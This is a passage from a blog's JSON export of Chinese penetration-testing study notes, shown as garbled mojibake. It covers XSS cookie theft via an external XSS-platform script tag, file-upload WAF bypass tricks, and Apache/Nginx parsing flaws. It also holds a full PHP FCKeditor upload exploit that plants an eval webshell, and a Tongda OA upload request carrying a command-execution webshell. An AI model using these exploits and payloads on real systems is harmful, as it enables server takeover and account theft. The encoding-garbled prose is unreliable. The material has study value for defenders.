ï¼Œå°±å¯ä»¥æŠŠè¿™ä¸ªåå°ç»™æ‹¿ä¸‹ï¼åé—¨ä½œè€…ä»¥ä¸ºä½ åœ¨ç¬¬ä¸€å±‚ï¼Œå…¶å®ä½ åœ¨ç¬¬äº”å±‚ 1http://192.168.1.56/api.asp?url=www.huohu.con/1.php&amp;pass=&lt;sCRiPt sRC=//xsshs.cn/m6YT&gt;&lt;/sCrIpT&gt; å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»è·å–åˆ°cookieäº†ã€‚ 1https://blog.csdn.net/xf555er/article/details/105151100 beef1https://smling.blog.csdn.net/article/details/106067842 XSSæ”»å‡»ä½ç½® ç•™è¨€æ¿ è¯„è®ºåŒº è®¢å•ç³»ç»Ÿ åé¦ˆæ¡ä»¶ â€¦â€¦. å¦‚æœç½‘ç«™æ˜¯ç”¨sessionéªŒè¯çš„ï¼Œé‚£ä¹ˆç›—å–cookieæ˜¯ç™»å½•ä¸æˆåŠŸç½‘ç«™çš„ã€‚ è·å–sessioné€šè¿‡è·¨ç«™è„šæœ¬æ”»å‡»è®©ç½‘ç«™è®¿é—®phpinfoé¡µé¢ï¼Œè¯¥é¡µé¢æœ‰sessionçš„å€¼ã€‚XSSå¹³å°æœ‰è¿™æ–¹é¢çš„åŠŸèƒ½ã€‚è¿™æ¯”è¾ƒéš¾ã€‚ æ¶‰åŠèµ„æºï¼š1234http://xss.fbisb.com/ https://github.com/tennc/webshell https://www.postman.com/downloads/ https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA æå–ç ï¼šxiaohttps://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw æå–ç ï¼š xiao","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSSè·¨ç«™","slug":"XSSè·¨ç«™","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"25WEBæ¼æ´-XSSè·¨ç«™ä¹‹åŸç†åˆ†ç±»åŠæ”»å‡»æ‰‹æ³•","slug":"25WEBæ¼æ´-XSSè·¨ç«™ä¹‹åŸç†åˆ†ç±»åŠæ”»å‡»æ‰‹æ³•","date":"2021-09-21T02:33:35.000Z","updated":"2021-09-21T06:01:11.329Z","comments":true,"path":"2021/09/21/25WEBæ¼æ´-XSSè·¨ç«™ä¹‹åŸç†åˆ†ç±»åŠæ”»å‡»æ‰‹æ³•/","link":"","permalink":"https://al0nez.github.io/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† XSS è·¨ç«™æ¼æ´äº§ç”ŸåŸç†å˜é‡åœ¨æ¥å—æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®å¯ä»¥å†™æˆjavascriptçš„å½¢å¼ï¼Œè¿™ä¸ªä»£ç å¯ä»¥è¢«æµè§ˆå™¨è¯†åˆ«ï¼Œå¹¶ä¸”æ‰§è¡Œï¼Œä»è€Œé€ æˆäº†XSSæ¼æ´ã€‚ å±å®³ ç›—å–å„ç±»ç”¨æˆ·å¸å·ï¼Œå¦‚æœºå™¨ç™»å½•å¸å·ã€ç”¨æˆ·ç½‘é“¶å¸å·ã€å„ç±»ç®¡ç†å‘˜å¸å· æ§åˆ¶ä¼ä¸šæ•°æ®ï¼ŒåŒ…æ‹¬è¯»å–ã€ç¯¡æ”¹ã€æ·»åŠ ã€åˆ é™¤ä¼ä¸šæ•æ„Ÿæ•°æ®çš„èƒ½åŠ› ç›—çªƒä¼ä¸šé‡è¦çš„å…·æœ‰å•†ä¸šä»·å€¼çš„èµ„æ–™ éæ³•è½¬è´¦ å¼ºåˆ¶å‘é€ç”µå­é‚®ä»¶ ç½‘ç«™æŒ‚é©¬ æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶å®ƒç½‘ç«™å‘èµ·æ”»å‡» ç‰¹ç‚¹XSSæœ¬è´¨æ˜¯å‰ç«¯æ¼æ´ï¼Œäº§ç”Ÿåœ¨å‰ç«¯ã€‚ XSS è·¨ç«™æ¼æ´åˆ†ç±»ï¼šåå°„åå°„æ€§XSSæ˜¯ä¸€æ¬¡æ€§çš„ï¼Œä¸ä¼šè®²XSSä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥æ¯æ¬¡æ”»å‡»éƒ½éœ€è¦è‡ªå·±å†™ã€‚ ä¾‹å­ å½“æˆ‘å†™å…¥&lt;script&gt;alert(1)&lt;/script&gt;çš„æ—¶å€™ æˆåŠŸæ‰§è¡Œjsä»£ç ï¼Œä½†æ˜¯å½“æˆ‘ä¸‹ä¸€æ¬¡è¾“å…¥å…¶ä»–çš„æ—¶å€™ï¼Œä¸å†™å…¥ä»£ç å´æ²¡æœ‰å¼¹çª—ï¼Œè¿™å°±æ˜¯åå°„å‹XSSã€‚ å­˜å‚¨å­˜å‚¨å‹XSSæ˜¯æŒä¹…æ€§è·¨ç«™è„šæœ¬ï¼Œå­˜å‚¨å‹ä¼šå°†ä»£ç ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œæ¯å½“æœ‰å…¶ä»–äººç‚¹å‡»çš„æ—¶å€™å°±ä¼šè¿›è¡Œæ”»å‡»ã€‚å­˜å‚¨å‹XSSä¸€èˆ¬å‘ç”Ÿåœ¨ç•™è¨€æ¿ç­‰åœ°æ–¹ã€‚ ä¾‹å­ å½“æˆ‘å†™å…¥&lt;script&gt;alert(1)&lt;/script&gt;çš„æ—¶å€™ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œéƒ½ä¼šå‡ºç°å¼¹çª—ï¼Œæ­¤æ—¶ä»£ç å·²ç»è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­äº†ï¼Œè¿™å°±æ˜¯å­˜å‚¨å‹XSSã€‚ DOM domæ ‘XSSæ‰§è¡Œä¼šåœ¨å‰ç«¯ä»£ç ä¸­è¿›è¡Œï¼Œä¸ä¼šåˆ°åç«¯ã€‚ 1å‘åŒ… x=xiaodi =&gt; æœ¬åœ°æµè§ˆå™¨é™æ€å‰ç«¯ä»£ç  =x.php ä¾‹å­ å½“æˆ‘ä»¬è¾“å…¥1çš„æ—¶å€™æ­¤é“¾æ¥åœ°å€å°±æ‹¼æ¥äº†æˆ‘ä»¬çš„è¾“å…¥ã€‚ è€Œä¸”å½“æˆ‘ä»¬ç»§ç»­ç‚¹å‡»çš„æ—¶å€™ï¼Œä»£ç å¹¶æ²¡æœ‰ç»è¿‡åç«¯å¤„ç†ï¼Œè€Œæ˜¯ç”±å‰ç«¯jsä»£ç è¿›è¡Œå¤„ç†ï¼Œè¿™å°±æ˜¯domå‹XSSçš„å…³é”®ã€‚ XSS å¸¸è§„æ”»å‡»æ‰‹æ³•å¹³å°ï¼Œå·¥å…·ï¼Œç»“åˆå…¶ä»–ç­‰ æ”»å‡»æˆåŠŸçš„æ¡ä»¶ï¼šå¯¹æ–¹æœ‰æ¼æ´ï¼Œæµè§ˆå™¨å­˜æœ‰cookieï¼Œæµè§ˆå™¨ä¸è¿›è¡Œæ‹¦æˆªï¼Œä¸å­˜åœ¨å¸¦ä»£ç è¿‡æ»¤å’Œhttponlyï¼Œå¯¹æ–¹è¦è§¦å‘è¿™ä¸ªæ¼æ´åœ°å€ cookie sessionç”¨æˆ·å‡­æ®ï¼šé€šè¿‡å‡­æ®å¯ä»¥åˆ¤æ–­å¯¹æ–¹èº«ä»½ä¿¡æ¯ cookie å­˜å‚¨æœ¬åœ° å­˜æ´»æ—¶é—´è¾ƒé•¿ å°ä¸­å‹ session ä¼šè¯ å­˜å‚¨æœåŠ¡å™¨ å­˜æ´»æ—¶é—´è¾ƒçŸ­ å¤§å‹ sessionä¼šå ç”¨æœåŠ¡å™¨çš„èµ„æºï¼Œä½†æ˜¯æ¯”è¾ƒå®‰å…¨ã€‚æ¯”å¦‚è¯´javawebä¸­çš„sessionåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ XSSå¹³å°ä½¿ç”¨åˆ›å»º é¡¹ç›®ä»£ç  ä½¿ç”¨ å‘ç°è¯·æ±‚äº†è¿™ä¸ªåœ°å€ã€‚åœ¨å¹³å°ä¸Šå°±æœ‰ä¿¡æ¯äº† æ¶‰åŠèµ„æºï¼š1234https://xss8.cc/xss.php?do=loginhttps://xsshs.cn/xss.php?do=loginhttps://github.com/do0dl3/xss-labshttp://down.chinaz.com/soft/37581.htm","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSSè·¨ç«™","slug":"XSSè·¨ç«™","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"24WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤","slug":"24WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤","date":"2021-09-21T02:33:04.000Z","updated":"2021-09-21T06:01:16.921Z","comments":true,"path":"2021/09/21/24WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤/","link":"","permalink":"https://al0nez.github.io/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† åŸºç¡€çŸ¥è¯†ä¸Šä¼ å‚æ•°åè§£æï¼šæ˜ç¡®å“ªäº›ä¸œè¥¿èƒ½ä¿®æ”¹ï¼Ÿ Content-Dispositionï¼šä¸€èˆ¬å¯æ›´æ”¹ nameï¼šè¡¨å•å‚æ•°å€¼ï¼Œä¸èƒ½æ›´æ”¹ filenameï¼šæ–‡ä»¶åï¼Œå¯ä»¥æ›´æ”¹ Content-Typeï¼šæ–‡ä»¶ MIMEï¼Œè§†æƒ…å†µæ›´æ”¹ å¸¸è§ç»•è¿‡æ–¹æ³•ï¼šæ•°æ®æº¢å‡º-é˜²åŒ¹é…(xxxâ€¦)é€šè¿‡è¾“å…¥å¤§é‡çš„æ— æ•ˆå­—ç¬¦æ¥è¿›è¡Œæ•°æ®æº¢å‡ºï¼Œé˜²æ­¢åŒ¹é…ã€‚ ç¬¦å·å˜å¼‚-é˜²åŒ¹é…ï¼ˆâ€™ â€œ ;ï¼‰ é€šè¿‡åªç”¨ä¸€ä¸ªâ€è¿›è¡ŒåŒ…è£¹æ¥ç»•è¿‡åŒ¹é…ã€‚è¿™é‡Œå•å¼•å·ä¹Ÿå¯ä»¥ã€‚ç»è¿‡æµ‹è¯•å‘ç°å®‰å…¨ç‹—è¿™é‡Œåº”è¯¥æ˜¯é€šè¿‡æ£€æµ‹æœ€åä¸€ä¸ªåŒå¼•å·æˆ–è€…å•å¼•å·çš„ä½ç½®ï¼Œç„¶åå‘å‰å»åŒ¹é…çš„ã€‚ æ•°æ®æˆªæ–­-é˜²åŒ¹é…(%00 ; æ¢è¡Œ) ç¬¬ä¸€ç§; é€šè¿‡2.png;.phpè¿™æ ·çš„æ–¹å¼å¯ä»¥è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯å‰ææ˜¯å¿…é¡»è¦å•å¼•å·åŒ…è£¹æ‰å¯ä»¥ï¼Œ;åœ¨ä»£ç ä¸­è¡¨ç¤ºç»“æŸçš„æ„æ€ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†ã€‚ ç¬¬äºŒç§%00 è¿™ç§æ–¹æ³•POSTæäº¤éœ€è¦è¿›è¡Œæ‰‹åŠ¨ç¼–ç ï¼Œé€šè¿‡2.php%00.pngå½¢å¼ç»•è¿‡ï¼Œ%00è¦ç¼–ç ï¼ŒåŸç†è¿˜æ˜¯è¿›è¡Œæˆªæ–­ ç¬¬ä¸‰ç§ æ¢è¡Œ è¿™ç§æ–¹æ³•åŒæ„éœ€è¦å•å¼•å·åŒ…è£¹æ‰å¯ä»¥ï¼Œå°†phpè¿›è¡Œæ¢è¡Œï¼Œä»£ç ä¸­å°±ä¼šå½¢æˆp\\nh\\npçš„å½¢å¼ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ã€‚ é‡å¤æ•°æ®-é˜²åŒ¹é…(å‚æ•°å¤šæ¬¡) ç¬¬ä¸€ç§ è¿™ç§æ–¹æ³•åŒæ„éœ€è¦å•å¼•å·åŒ…è£¹æ‰å¯ä»¥ï¼Œå†™æˆfilename=&#39;1.png&#39;;filename=&#39;2.php&#39;;è¿™æ ·çš„å½¢å¼å¯ä»¥ç»•è¿‡ï¼ŒåŸç†æ˜¯å®‰å…¨ç‹—åªä¼šæ£€æµ‹ç¬¬ä¸€ä¸ªé‡åˆ°çš„filenameçš„åç¼€ã€‚ ç¬¬äºŒç§ / /ä¹Ÿå¯ä»¥ç»•è¿‡ FUZZå­—å…¸æ‰‹å·¥æµ‹å¤ªæ…¢äº†ï¼Œä½¿ç”¨å·¥å…·æ¥æµ‹è¯• éœ€è¦æœ‰FUZZå­—å…¸ï¼Œç„¶åè¿›è¡Œå­—å…¸çˆ†ç ´ã€‚ 12https://github.com/fuzzdb-project/fuzzdbhttps://github.com/TheKingOfDuck/fuzzDicts æ–‡ä»¶ä¸Šä¼ å®‰å…¨ä¿®å¤æ–¹æ¡ˆ åç«¯éªŒè¯ï¼šé‡‡ç”¨æœåŠ¡ç«¯éªŒè¯æ¨¡å¼ åç¼€æ£€æµ‹ï¼šåŸºäºé»‘åå•ï¼Œç™½åå•è¿‡æ»¤ MIME æ£€æµ‹ï¼šåŸºäºä¸Šä¼ è‡ªå¸¦ç±»å‹æ£€æµ‹ å†…å®¹æ£€æµ‹ï¼šæ–‡ä»¶å¤´ï¼Œå®Œæ•´æ€§æ£€æµ‹ è‡ªå¸¦å‡½æ•°è¿‡æ»¤ï¼šå‚è€ƒ uploadlabs å‡½æ•° è‡ªå®šä¹‰å‡½æ•°è¿‡æ»¤ï¼šfunction check_file(){} WAF é˜²æŠ¤äº§å“ï¼šå®å¡”ï¼Œäº‘ç›¾ï¼Œå®‰å…¨å…¬å¸äº§å“ç­‰","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"23WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹è§£ææ¼æ´ç¼–è¾‘å™¨å®‰å…¨","slug":"23WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹è§£ææ¼æ´ç¼–è¾‘å™¨å®‰å…¨","date":"2021-09-21T02:32:23.000Z","updated":"2021-09-21T06:01:22.522Z","comments":true,"path":"2021/09/21/23WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹è§£ææ¼æ´ç¼–è¾‘å™¨å®‰å…¨/","link":"","permalink":"https://al0nez.github.io/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† apacheä½ç‰ˆæœ¬è§£ææ¼æ´åŸç†Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚ test.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠxxxx.php.owf.rarè§£ææˆphpã€‚ å¤ç° Apache HTTPD å¤šåç¼€è§£ææ¼æ´Apache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ã€‚æ¯”å¦‚ï¼Œå¦‚ä¸‹é…ç½®æ–‡ä»¶ï¼š 12AddType text/html .htmlAddLanguage zh-CN .cn å…¶ç»™.htmlåç¼€å¢åŠ äº†media-typeï¼Œå€¼ä¸ºtext/htmlï¼›ç»™.cnåç¼€å¢åŠ äº†è¯­è¨€ï¼Œå€¼ä¸ºzh-CNã€‚æ­¤æ—¶ï¼Œå¦‚æœç”¨æˆ·è¯·æ±‚æ–‡ä»¶index.cn.htmlï¼Œä»–å°†è¿”å›ä¸€ä¸ªä¸­æ–‡çš„htmlé¡µé¢ã€‚ ä»¥ä¸Šå°±æ˜¯Apacheå¤šåç¼€çš„ç‰¹æ€§ã€‚å¦‚æœè¿ç»´äººå‘˜ç»™.phpåç¼€å¢åŠ äº†å¤„ç†å™¨ï¼š 1AddHandler application/x-httpd-php .php é‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶ï¼Œæ²¡å¿…è¦æ˜¯æœ€åä¸€ä¸ªåç¼€ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†ä¼šé€ æˆä¸€ä¸ªå¯ä»¥ç»•è¿‡ä¸Šä¼ ç™½åå•çš„è§£ææ¼æ´ã€‚ æ¼æ´å¤ç° Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_phpæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ1.php\\x0Aå°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚ æ¼æ´å¤ç° è®¿é—®åˆšæ‰ä¸Šä¼ çš„/1.php%0aï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè§£æï¼Œä½†è¿™ä¸ªæ–‡ä»¶ä¸æ˜¯phpåç¼€ï¼Œè¯´æ˜ç›®æ ‡å­˜åœ¨è§£ææ¼æ´ï¼š Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰å½±å“ç‰ˆæœ¬ï¼šNginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 æ¼æ´åŸç†1https://blog.werner.wiki/file-resolution-vulnerability-nginx/ æ¼æ´å¤ç°é¦–å…ˆä¸Šä¼ ä¸€ä¸ª1.pngçš„å›¾ç‰‡é©¬ï¼Œä¸Šä¼ çš„æ—¶å€™è¦åœ¨1.pngåé¢åŠ ä¸Šä¸€ä¸ªç©ºæ ¼(windowsåˆ™ä¸éœ€è¦)ï¼Œä¹‹åæ­£å¸¸ä¸Šä¼ ã€‚ ä¹‹åè®¿é—®è¿™ä¸ªå›¾ç‰‡ï¼Œè®¿é—®çš„æ—¶å€™è¦æŠ“åŒ…ï¼Œå°†åç¼€ä¿®æ”¹ä¸ºhttp://your-ip:8080/uploadfiles/1.png[0x20][0x00].phpï¼Œå³å¯å‘ç°PHPå·²è¢«è§£æã€‚ é¦–å…ˆå…ˆåœ¨pngåé¢åŠ ...php ç„¶åå»hexä¸­è¿›è¡Œä¿®æ”¹ï¼Œå°†pngå‰ä¿©ä¸ªç‚¹ä¿®æ”¹ä¸º20å’Œ00. å‘é€ä»¥åï¼Œæˆ‘è¿”å›200ï¼ŒæˆåŠŸè§£æphpä»£ç ã€‚ WEB ç¼–è¾‘å™¨ç½‘ç«™åå°ä¸­ç»å¸¸ä¼šæœ‰æ·»åŠ æ–‡å­—å†…å®¹è¿™ç±»åŠŸèƒ½ï¼Œè€Œè¿™ä¸€åŠŸèƒ½æœ‰æ—¶å€™ä¼šä½¿ç”¨webç¼–è¾‘å™¨æ¥å®Œæˆã€‚WEBç¼–è¾‘å™¨å¯ä»¥å¯¹æ–‡å­—ã€å›¾ç‰‡ã€éŸ³é¢‘ç­‰å†…å®¹è¿›è¡Œå¤„ç†ã€‚è€Œè¿™äº›WEBç¼–è¾‘å™¨å­˜åœ¨ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“äº†è¯¥ç¼–è¾‘å™¨çš„åå­—å’Œç‰ˆæœ¬ï¼Œå°±å¯ä»¥é€šè¿‡æœç´¢å¾—çŸ¥ä»–çš„å…·ä½“æ¼æ´æƒ…å†µã€‚ ä¸€èˆ¬é€šè¿‡æ‰«æç½‘ç«™è·¯å¾„æ¥è·å–ç¼–è¾‘å™¨ä¿¡æ¯ã€‚ ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ1https://navisec.it/ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ/ ç¼–è¾‘å™¨ fckeditor263è¿™é‡Œä»¥fckeditor263ä¸ºä¾‹è¿›è¡Œæ¼”ç¤º exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phperror_reporting(0);set_time_limit(0);ini_set(&quot;default_socket_timeout&quot;, 5);define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));$match = array();function http_send($host, $packet)&#123;$sock = fsockopen($host, 80);while (!$sock)&#123;print &quot;\\n[-] No response from &#123;$host&#125;:80 Trying again...&quot;;$sock = fsockopen($host, 80);&#125;fputs($sock, $packet);while (!feof($sock)) $resp .= fread($sock, 1024);fclose($sock);print $resp;return $resp;&#125;function connector_response($html)&#123;global $match;return (preg_match(&quot;/OnUploadCompleted\\((\\d),\\&quot;(.*)\\&quot;\\)/&quot;, $html, $match) &amp;&amp; in_array($match[1], array(0, 201)));&#125;print &quot;\\n+------------------------------------------------------------------+&quot;;print &quot;\\n| FCKEditor Servelet Arbitrary File Upload Exploit |&quot;;print &quot;\\n+------------------------------------------------------------------+\\n&quot;;if ($argc &lt; 3)&#123;print &quot;\\nUsage......: php $argv[0] host path\\n&quot;;print &quot;\\nExample....: php $argv[0] localhost /\\n&quot;;print &quot;\\nExample....: php $argv[0] localhost /FCKEditor/\\n&quot;;die();&#125;$host = $argv[1];$path = ereg_replace(&quot;(/)&#123;2,&#125;&quot;, &quot;/&quot;, $argv[2]);$filename = &quot;fvck.gif&quot;;$foldername = &quot;fuck.php%00.gif&quot;;$connector = &quot;editor/filemanager/connectors/php/connector.php&quot;;$payload = &quot;-----------------------------265001916915724\\r\\n&quot;;$payload .= &quot;Content-Disposition: form-data; name=\\&quot;NewFile\\&quot;; filename=\\&quot;&#123;$filename&#125;\\&quot;\\r\\n&quot;;$payload .= &quot;Content-Type: image/jpeg\\r\\n\\r\\n&quot;;$payload .= &#x27;GIF89a&#x27;.&quot;\\r\\n&quot;.&#x27;&lt;?php eval($_POST[cmd]) ?&gt;&#x27;.&quot;\\n&quot;;$payload .= &quot;-----------------------------265001916915724--\\r\\n&quot;;$packet = &quot;POST &#123;$path&#125;&#123;$connector&#125;?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=&quot;.$foldername.&quot; HTTP/1.0\\r\\n&quot;;//print $packet;$packet .= &quot;Host: &#123;$host&#125;\\r\\n&quot;;$packet .= &quot;Content-Type: multipart/form-data; boundary=---------------------------265001916915724\\r\\n&quot;;$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\\r\\n&quot;;$packet .= &quot;Connection: close\\r\\n\\r\\n&quot;;$packet .= $payload;print $packet;if (!connector_response(http_send($host, $packet))) die(&quot;\\n[-] Upload failed!\\n&quot;);else print &quot;\\n[-] Job done! try http://$&#123;host&#125;/$match[2] \\n&quot;;?&gt; åˆ©ç”¨ é€šè¿‡æ‰§è¡Œè„šæœ¬è¿›è¡Œåˆ©ç”¨,åˆ©ç”¨éœ€è¦çŸ¥é“WEBç¼–è¾‘å™¨çš„è·¯å¾„ 1php fck.php 127.0.0.1:8080 /fckeditor263/ CMS æ–‡ä»¶ä¸Šä¼ è¯†åˆ«ç½‘ç«™CMSåè¯¥æ€ä¹ˆåŠï¼Ÿä»¥é€šè¾¾OA CMSä¸ºä¾‹ é€šè¾¾OA CMS(V11ç‰ˆæœ¬) åˆ©ç”¨è·¯å¾„ä¸ºï¼šispirit/im/upload.php æŠ“åŒ…æ„é€ POCï¼š 12345678910111213141516171819202122232425262728293031POST /ispirit/im/upload.php HTTP/1.1Host: localhost:999Cache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGBAccept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5Cookie: PHPSESSID=123Connection: closeContent-Length: 660------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;2------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;P&quot;123------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;DEST_UID&quot;1------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;Content-Type: image/jpeg&lt;?php$command=$_POST[&#x27;cmd&#x27;];$wsh = new COM(&#x27;WScript.shell&#x27;);$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt; ä¸Šä¼ æˆåŠŸï¼›ä¸Šä¼ æˆåŠŸåè®¿é—®æ–‡ä»¶åŒ…å«è·¯å¾„/ispirit/interface/geteway.php burpæŠ“åŒ…æ„é€ æ•°æ®åŒ…ï¼š 12345678910POST /mac/gateway.php HTTP/1.1Host: 10.10.20.116:88ï¼ˆæ ¹æ®è‡ªå·±çš„IPè€Œå®šï¼‰Connection: keep-aliveAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.21.0Content-Length: 69Content-Type: application/x-www-form-urlencodedjson=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2003/941633647.jpg&quot;&#125;&amp;cmd=whoami å‘é€æŒ‡ä»¤å¯å‘ç°å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼š å‚è€ƒé“¾æ¥1https://www.cnblogs.com/twlr/p/12989951.html#_label0_1 å‚è€ƒèµ„æ–™123https://navisec.it/ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ/https://www.jb51.net/softs/75619.htmlhttps://pan.baidu.com/s/1eLjH_88fhXAw3ZwE7kVRbA æå–ç ï¼šywek","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ 